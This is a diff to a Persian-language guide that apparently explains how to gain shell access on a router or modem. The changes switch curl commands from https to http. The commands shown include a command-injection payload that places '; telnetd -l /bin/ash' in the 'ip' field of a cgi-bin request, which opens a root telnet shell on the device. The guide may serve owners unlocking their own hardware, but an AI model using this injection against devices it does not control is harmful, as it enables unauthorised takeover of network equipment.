@@ -66,7 +66,7 @@
 
 #### لینوکس / مک
 ```bash
-curl -k https://192.168.70.1/cgi-bin/http.cgi \
+curl -k http://192.168.70.1/cgi-bin/http.cgi \
  -X POST \
  --data-raw '{
   "method":"POST",
@@ -85,7 +85,7 @@ curl -k https://192.168.70.1/cgi-bin/http.cgi \
 #### ویندوز (CMD / PowerShell)
 
 ```powershell
-curl.exe -k "https://192.168.70.1/cgi-bin/http.cgi" ^
+curl.exe -k "http://192.168.70.1/cgi-bin/http.cgi" ^
  -X POST ^
  --data-raw "{\"method\":\"POST\",\"cmd\":302,\"LinkMode\":\"linkIP\",\"IpVersion\":\"IPV4\",\"IpMode\":\"dhcp\",\"MTU\":1500,\"NatEnable\":\"1\",\"wanRouter\":\"1\",\"language\":\"EN\",\"sessionId\":\"<YOUR_SESSION_ID>\"}"
 ```
@@ -97,7 +97,7 @@ curl.exe -k "https://192.168.70.1/cgi-bin/http.cgi" ^
 
 #### لینوکس / مک
 ```bash
-curl -k https://192.168.70.1/cgi-bin/http.cgi \
+curl -k http://192.168.70.1/cgi-bin/http.cgi \
  --data-raw '{
   "enabled":"1",
   "ip":"192.168.1.1 ; telnetd -l /bin/ash",
@@ -113,7 +113,7 @@ curl -k https://192.168.70.1/cgi-bin/http.cgi \
 #### ویندوز (CMD / PowerShell)
 
 ```powershell
-curl.exe -k "https://192.168.70.1/cgi-bin/http.cgi" ^
+curl.exe -k "http://192.168.70.1/cgi-bin/http.cgi" ^
  --data-raw "{\"enabled\":\"1\",\"ip\":\"192.168.1.1 ; telnetd -l /bin/ash\",\"cmd\":172,\"method\":\"POST\",\"subcmd\":6,\"language\":\"EN\",\"sessionId\":\"<YOUR_SESSION_ID>\"}"
 ```
 ---
